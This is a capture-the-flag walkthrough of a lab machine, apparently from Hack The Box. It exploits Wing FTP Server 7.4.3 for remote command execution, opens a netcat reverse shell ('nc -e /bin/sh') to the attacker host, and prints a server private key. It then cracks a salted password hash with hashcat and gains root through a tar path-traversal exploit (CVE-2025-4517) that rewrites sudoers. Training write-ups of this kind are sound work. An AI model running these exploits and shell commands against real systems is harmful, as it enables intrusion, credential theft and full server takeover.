# WingData

As always, we begin with the cybersecurity equivalent of knocking on the door and immediately yelling “MAINTENANCE!” — an Nmap scan:

```shellscript
$ nmap -sC -sV 10.129.4.226 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-20 06:37 CST
Nmap scan report for 10.129.4.226
Host is up (0.0076s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b (ECDSA)
|_  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f (ED25519)
80/tcp open  http    Apache httpd 2.4.66
|_http-title: Did not follow redirect to http://wingdata.htb/
Service Info: Host: localhost; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.54 seconds
```

Two ports. Two moods:

* 22/SSH: “Maybe later.”
* 80/HTTP: “Come look at my website, I swear it’s safe.”

So we check out the webpage:

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

And right away there’s a big shiny `Client Portal` button that’s basically screaming "Click me, im important!"

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

Boom — it’s an FTP web client. And not just any FTP web client… it’s running `Wing FTP Server v7.4.3`. Which is great news for us, because version numbers are basically loot boxes. A quick Google drive-by and we find an Exploit-DB PoC: [https://www.exploit-db.com/exploits/52347](https://www.exploit-db.com/exploits/52347) and honestly, it’s practically begging to be used.

```shellscript
$ python3 52347.py 
usage: 52347.py [-h] [-u URL] [-f FILE] [-c COMMAND] [-v] [-o OUTPUT]
                [-U USERNAME]
52347.py: error: Either -u/--url or -f/--file must be specified

$ python3 52347.py -u http://ftp.wingdata.htb -c id

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'id' and username: 'anonymous'
[+] UID extracted: 5ae8128c66355f2fa6b11ae1a2bf53e1f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 5ae8128c66355f2fa6b11ae1a2bf53e1f528764d624db129b32c21fbca0cb8d6

--- Command Output ---
uid=1000(wingftp) gid=1000(wingftp) groups=1000(wingftp),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev)
----------------------
```

Nice. We’ve got command execution. Time to upgrade from “I can run commands” to “I live here now.”&#x20;

Netcat is available, so we try the classic “please call me back” command:

```shellscript
$ python3 52347.py -u http://ftp.wingdata.htb -c "nc -e /bin/sh 10.10.15.207 1234"

[*] Testing target: http://ftp.wingdata.htb
[+] Sending POST request to http://ftp.wingdata.htb/loginok.html with command: 'nc -e /bin/sh 10.10.15.207 1234' and username: 'anonymous'
[+] UID extracted: 2f7afb3803fad6479d27ef0682840bc5f528764d624db129b32c21fbca0cb8d6
[+] Sending GET request to http://ftp.wingdata.htb/dir.html with UID: 2f7afb3803fad6479d27ef0682840bc5f528764d624db129b32c21fbca0cb8d6
```

Listener on our side:

```shellscript
$ nc -lvnp 1234
listening on [any] 1234 ...
connect to [10.10.15.207] from (UNKNOWN) [10.129.4.226] 42630
```

And boom — shell acquired. Not a fancy one, but it breathes.

Then I start rummaging around the install directory like a raccoon in a dumpster behind an electronics store… and I find this:

```shellscript
ls
Data
License.txt
Log
lua
pid-wftpserver.pid
README
session
session_admin
version.txt
webadmin
webclient
wftpconsole
wftp_default_ssh.key
wftp_default_ssl.crt
wftp_default_ssl.key
wftpserver
cat wftp_default_ssh.key
-----BEGIN PRIVATE KEY-----
MIIJQgIBADANBgkqhkiG9w0BAQEFAASCCSwwggkoAgEAAoICAQDZvUZVTlzaXtW6
T2zIW9BYYd9AKP1Wj1ukVn7tGhrd4ISNj0iX6kdw27dSu40lejrpTxntWjx+rZzc
+21c0L8xuyl4Wd7FyRmKzesmdczwcbGL0dJN/4dD03WsIigppA6YnmALzZylybHR
mQgPFA6/CZJp6qSk8ISiUVdo1sL2mvWJKxBofKudUGY46IBFhdwB3ekywlgXH0R+
5OaM3RryqpLf7vFSvxaNWLoYO9AaMlh3MQQE92e4FGyKFwy57sJTY6tjT/JTx5IK
Xk27et4CvfHXDRAd1wmz1im5hhY6oAz1GapM+xf7ii6Fq3YkOoIuBCi9dGPMA+e5
AFRYlztjTirpGkPrkWuk4WNr2NMytjBxUpePKrkgMwBkpBLQ2P8zdEnmLKofBZDq
IfQMq471QeRHlqMce6f0NRj1uw3ctp2VuTDkHueSKmUTgDLMbOYemceeM3xmQ3+w
1L3GmMuHW0Uj+TnFa2uWRhFl3kg9jHPZmCg2YOwg/mW5YPjeib4mhrNjYpsThKTT
4Y7G0qjUhcfld6vI7N5m99NxBwkJ7EaK/0Y1pwwHrM7dS04dEnFmiaG+O059uhsp
ApvCMz4RJjv20nG+WQRl8bH7oHm/Ik3+m22LbURk2tc/dCLdu6b9nWIBuG1lRhby
BIvZ+2jQRRH+bQLgT78f+LdxfFth1QIDAQABAoICAQDT1eFnfSW5DirBaCRdiXXZ
ht68fSR74l02NTCnXI5m7tgHIS9vHO8ETb69LtrTa2eFNP/0e6X/WMkT9Ukg07Yv
m/dsr4KcylmfQVdVw6XvB63Eag5A9CmVQ1VocpLAcGwC75Jh6VhNszzcvhWpFcqC
8b0Qbshf7+AaSyjPRqHHalsXaF4+SYxtMJtDInApM2IoLs2CJLGvTSxGiEwFH9fn
3yul0cHWzzIRshDbItYDppeK3pUaf9jYroYqkuI+wpsspftIU69e8vqSO81EaPU1
lbaDkqHrZhp6bBGL/XgC8VOp4Z5d5qwefQFl6rq15HZibol0SJgPFH2M71UgG4IZ
/6PdyamVfLsCN+z8nkNZOFBeKESSdE/bTAM9JftE/rZWxMfsUgkTUJiJSHeJVX6v
LQ8591mdDixWOn3i/7uxhv9YPEdvQ4siLQUdwYjrDez1hGqIpJYeWoJboN/muDFK
LMgHO/9KuLl7SnD7dryQe6fQvcgbAbQWFtbiiT3NdCSJXdtM0NIWixNJ3ZdTbif/
bd8P9W7U8H4CweABw6NGYLVSTjZETWBoC7+i9z2Yz8eePB53l/9U8V/dGcrmVgAJ
aUCm1WN9AYMYS6m4Vu5uPDGLsA6/QFa+tFwzL+dYO1cZPzX2iyUVvL4Dhuznye++
jrJedPM512x0jaJbIbXMAQKCAQEA8RAG2idFnzbigZeYbt/adQIFXsnB00SGJGSi
jzbog2xW7jg1ofh2ywtyt1p7wX0MkFRJECpwYMIxXC5tqFGIw5te9JOVKj2NR6fT
GxnJMbt2LgL6NJiTobAoSwsfr57ZP3NnNlx9bjB2hL3Mwe8TyKNev8c4bucAbA7W
mn4fnp3mzH7+5uj6F934vzIK7lCFaul81mCpuhHl4LJV5+YoxmN4XiahvcTVX2EM
r8Vv+/y2b+cCS9O0by5NSwTmV+RHMaD+hlZEP3e98gQdy7x5sm2r4yBjTVGReWDR
FYLG0ePffnoYdlLTNfRtwpB+SvCxh1Fz3OGgBYpn432iLGdlZQKCAQEA5ztFgzbM
NVX53dcMvF8s2F2tUJ7930BgINvVcfl6galjUhp8d3ba8Kk1gE9cUB3WyZhRPbx+
NK9EZND5RnRv8o4yrJb3amA/YF19RMH62jHnPjibdIUesNcW0YmB4CYNxWgLgR6m
xs1R+c8sgzrgbtrF2yuCHSEa3+Pr1TB010R9pV8yxrvFJvjAV5z4g2x9hw54OPiY
S5WAQXP2TAU5ZiUqIJtslMhMhzcFxXse/1PN9SAXY3iM1tKXAT3SBjzydEafCtyC
4Xd7SsTI0lXSmIqoihH+XzOmC9mWuoMFG40zfNRLafNhS/4G1vRs4OBpx+YBUKcy
wasyCS9eGoA7sQKCAQBNP06Cz7zetU7GKlb9iJxPjHM+GbcTxUybEuiIrha6Lph4
w+hj2+PtUuDS4prvuOuywF+dX4wdZX09xd775gzGad52z2goXgsM4Dmk4JF5b1IC
ko+tFQuR74op6gmgVG3XiFqVr/O9wKfqB4w6xSr4y2lMWUG7QCkBd4vLfAkT4hOY
ikWSpyulREs2sYmRLppiVSnc5KLe7mdUprEim72LPUrQGN8RmaaqZsYS+VjWTfgE
SemRdOjIC/VWyd4qYgtyWt3VHIXINM3YZPtLUz1IMR64rKNFnpLYa270zrB5h+UR
eXynRglKq+YUSAtAZnrtGuve5ypJPD3oR1UVl5iFAoIBAFviB5s+WSMQiPuICr2H
rFBF2SriIstlz0z/Te++TNndL2RetfrateFPu7zCzFHhqYnuBspbbmMNCkZta8B9
YEaoDqbaTnJs0IJAZBjAZCf0EIl/APbqNunabmzREVS6ilpZH8ktHuR8jgiQNIXp
DWm/cUPIJCnjD8TL0tiiKqunwa3HCGxEDPGRgwzNiUrf/3l9XHR3BD10qMRZihNn
OAnI1taiLCFq/k30pUx1wjl/WaYAHIsgSgbLI8oQgLaN3WIq9ePg//kL+2gYjhxW
khqfbp1+zO+TnHW0/toaWhs6nq0JxvXRCmaiCKG9+s3ZHu+aDAe6iMbAel9//QrW
zeECggEASxx6IAyJRZeVX1SJI/nPDHEh/3JicxScBHCIKTfgTbAi3pntTHOrbCC1
g6Df/7JL4oFLdBunORMGM76XUH9S8V7woxnOZ0Mbf6Q8m3WJ8bW9z73BDcdnLUXZ
Ukskqp6fAqpGBs7TeJTKG8eE8cDsbKTtIGtOa3q+r8aiNBkx04IohYCa2Nc7mJ/j
zDWJEkPgOV4nR/Py8E1ueEn/92eJD1E5jXIeN+BJxibJg5PisB33UfN93ctRgL5L
te49DBgnbe4Ylaf9qfsBjIOhdS6RgBacdVN3+G4ft90miDu8DfPp1LxWTibn7mqP
7wpyB+9adMOI1VJ3lX5hdO3F2Xw4Cg==
-----END PRIVATE KEY-----
```

A private key just sitting there, casually, like it pays rent. So obviously I think: “Great, I’ll download this and SSH for a stable shell.”

```shellscript
$ ssh wingftp@10.129.4.226 -i wingftp.key
wingftp@10.129.4.226's password: 
```

The key didn’t work on its own, SSH still wants a password. So now we do what every hacker does when Plan A fails: we start snooping harder.



Wing FTP stores user configs in: `/opt/wftpserver/Data/1/users` and inside… a lineup of users like it’s a sitcom cast:

```shellscript
wingftp@wingdata:/opt/wftpserver/Data/1/users$ ls
ls
anonymous.xml  john.xml  maria.xml  steve.xml  wacky.xml
wingftp@wingdata:/opt/wftpserver/Data/1/users$ cat wacky.xml
cat wacky.xml
<?xml version="1.0" ?>
<USER_ACCOUNTS Description="Wing FTP Server User Accounts">
    <USER>
        <UserName>wacky</UserName>
        <EnableAccount>1</EnableAccount>
        <EnablePassword>1</EnablePassword>
        <Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
        <ProtocolType>63</ProtocolType>
        <EnableExpire>0</EnableExpire>
        <ExpireTime>2025-12-02 12:02:46</ExpireTime>
        <MaxDownloadSpeedPerSession>0</MaxDownloadSpeedPerSession>
        <MaxUploadSpeedPerSession>0</MaxUploadSpeedPerSession>
        <MaxDownloadSpeedPerUser>0</MaxDownloadSpeedPerUser>
        <MaxUploadSpeedPerUser>0</MaxUploadSpeedPerUser>
        <SessionNoCommandTimeOut>5</SessionNoCommandTimeOut>
        <SessionNoTransferTimeOut>5</SessionNoTransferTimeOut>
        <MaxConnection>0</MaxConnection>
        <ConnectionPerIp>0</ConnectionPerIp>
        <PasswordLength>0</PasswordLength>
        <ShowHiddenFile>0</ShowHiddenFile>
        <CanChangePassword>0</CanChangePassword>
        <CanSendMessageToServer>0</CanSendMessageToServer>
        <EnableSSHPublicKeyAuth>0</EnableSSHPublicKeyAuth>
        <SSHPublicKeyPath></SSHPublicKeyPath>
        <SSHAuthMethod>0</SSHAuthMethod>
        <EnableWeblink>1</EnableWeblink>
        <EnableUplink>1</EnableUplink>
        <EnableTwoFactor>0</EnableTwoFactor>
        <TwoFactorCode></TwoFactorCode>
        <ExtraInfo></ExtraInfo>
        <CurrentCredit>0</CurrentCredit>
        <RatioDownload>1</RatioDownload>
        <RatioUpload>1</RatioUpload>
        <RatioCountMethod>0</RatioCountMethod>
        <EnableRatio>0</EnableRatio>
        <MaxQuota>0</MaxQuota>
        <CurrentQuota>0</CurrentQuota>
        <EnableQuota>0</EnableQuota>
        <NotesName></NotesName>
        <NotesAddress></NotesAddress>
        <NotesZipCode></NotesZipCode>
        <NotesPhone></NotesPhone>
        <NotesFax></NotesFax>
        <NotesEmail></NotesEmail>
        <NotesMemo></NotesMemo>
        <EnableUploadLimit>0</EnableUploadLimit>
        <CurLimitUploadSize>0</CurLimitUploadSize>
        <MaxLimitUploadSize>0</MaxLimitUploadSize>
        <EnableDownloadLimit>0</EnableDownloadLimit>
        <CurLimitDownloadLimit>0</CurLimitDownloadLimit>
        <MaxLimitDownloadLimit>0</MaxLimitDownloadLimit>
        <LimitResetType>0</LimitResetType>
        <LimitResetTime>1762103089</LimitResetTime>
        <TotalReceivedBytes>0</TotalReceivedBytes>
        <TotalSentBytes>0</TotalSentBytes>
        <LoginCount>2</LoginCount>
        <FileDownload>0</FileDownload>
        <FileUpload>0</FileUpload>
        <FailedDownload>0</FailedDownload>
        <FailedUpload>0</FailedUpload>
        <LastLoginIp>127.0.0.1</LastLoginIp>
        <LastLoginTime>2025-11-02 12:28:52</LastLoginTime>
        <EnableSchedule>0</EnableSchedule>
    </USER>
</USER_ACCOUNTS>
wingftp@wingdata:/opt/wftpserver/Data/1/users$
```

That hash looks like SHA-256, but WingFTP salts passwords with WingFTP (because subtlety is overrated, [https://www.wftpserver.com/help/ftpserver/index.html?administration.htm](https://www.wftpserver.com/help/ftpserver/index.html?administration.htm)). So we format it like: `32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP`

Hashcat time: unleash the GPU gremlins

```shellscript
$ hashcat -m 1410 single_hash.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-AMD EPYC 7543 32-Core Processor, skipped

OpenCL API (OpenCL 2.1 LINUX) - Platform #2 [Intel(R) Corporation]
==================================================================
* Device #2: AMD EPYC 7543 32-Core Processor, 3923/7910 MB (988 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 1 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP:!#7Blushing^*Bride5
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1410 (sha256($pass.$salt))
Hash.Target......: 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b87...ingFTP
Time.Started.....: Fri Feb 20 07:54:35 2026 (3 secs)
Time.Estimated...: Fri Feb 20 07:54:38 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#2.........:  4101.4 kH/s (0.17ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 14344192/14344385 (100.00%)
Rejected.........: 0/14344192 (0.00%)
Restore.Point....: 14342144/14344385 (99.98%)
Restore.Sub.#2...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#2....: !9kitty ->  ladykitz

Started: Fri Feb 20 07:54:34 2026
Stopped: Fri Feb 20 07:54:39 2026

```

Password recovered: `!#7Blushing^*Bride5` that password has more drama than a reality TV finale.

```shellscript
$ ssh wacky@10.129.4.226
wacky@10.129.4.226's password: 
Linux wingdata 6.1.0-42-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.159-1 (2025-12-30) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb 20 09:01:53 2026 from 10.10.15.207

```

We’re in. Stable shell. Real user. Real home directory. Real problems. And yes, we collect our shiny participation trophy:

```shellscript
wacky@wingdata:~$ cd /home/wacky
wacky@wingdata:~$ cat user.txt 
fa049c5e46ad478c2405c65428991e42
```

> **User flag:** fa049c5e46ad478c2405c65428991e42

Now we ask the most important question in Linux: “What can I run as root without paying for it?”

```shellscript
wacky@wingdata:~$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
wacky@wingdata:~$ 

```

So we can run a backup restore script as root. Which is basically the same as being handed the keys to a vault and being told: “Please don’t be weird.” Checking the help menu:

```shellscript
wacky@wingdata:~$ /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -h
usage: restore_backup_clients.py [-h] -b BACKUP -r RESTORE_DIR

Restore client configuration from a validated backup tarball.

options:
  -h, --help            show this help message and exit
  -b BACKUP, --backup BACKUP
                        Backup filename (must be in
                        /home/wacky/backup_clients/ and match
                        backup_<client_id>.tar, where <client_id> is a
                        positive integer, e.g., backup_1001.tar)
  -r RESTORE_DIR, --restore-dir RESTORE_DIR
                        Staging directory name for the restore operation. Must
                        follow the format: restore_<client_user> (e.g.,
                        restore_john). Only alphanumeric characters and
                        underscores are allowed in the <client_user> part
                        (1–24 characters).

Example: sudo restore_backup_clients.py -b backup_1001.tar -r restore_john
```

It tries to be strict. But strict scripts are often just insecure scripts wearing glasses. After some Google archaeology, we find a PoC for a path traversal CVE: [`CVE-2025-4517`](https://github.com/bgutowski/CVE-2025-4517-POC-Sudoers/blob/main/CVE_2025_4517.py) so we generate a malicious tarball:

```shellscript
wacky@wingdata:/tmp$ python3 CVE_2025_4517.py wacky backup_1.tar
--- Generating Malicious Tar: backup_1.tar ---
--- Done! backup_1.tar created successfully. ---
```

Move it into place:

```shellscript
wacky@wingdata:/opt/backup_clients/backups$ mv /tmp/backup_1.tar .
```

Run the restore as root:

```shellscript
wacky@wingdata:/opt/backup_clients/backups$ sudo /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py -b backup_1.tar -r restore_test
[+] Backup: backup_1.tar
[+] Staging directory: /opt/backup_clients/restored_backups/restore_test
[+] Extraction completed in /opt/backup_clients/restored_backups/restore_test
```

We check sudo again and…

```shellscript
wacky@wingdata:/opt/backup_clients/restored_backups/restore_test$ sudo -l
Matching Defaults entries for wacky on wingdata:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User wacky may run the following commands on wingdata:
    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
    (ALL : ALL) NOPASSWD: ALL
```

We basically just convinced the system to hand us god mode.

```shellscript
wacky@wingdata:/opt/backup_clients/backups$ sudo su
root@wingdata:/opt/backup_clients/backups# cat /root/root.txt
78314cfe9b0e816a51afa2f51c4f9495
```

> **Root flag:** 78314cfe9b0e816a51afa2f51c4f9495
